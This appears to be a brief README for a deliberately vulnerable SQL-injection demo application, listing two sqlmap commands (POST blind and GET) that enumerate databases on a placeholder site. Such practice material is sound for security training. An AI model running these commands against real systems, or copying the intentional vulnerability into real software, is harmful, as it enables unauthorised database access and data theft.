# SQL-injection
Sample application the SQL injection vulnerablity. Coded by Xale


sqlmap payload ( blind ) : sqlmap -u "site/index.php" --method="POST" --data="veri=asd" --dbs
sqlmap payload ( get ) : sqlmap -u "site/yazi.php?id=1" --batch --dbs
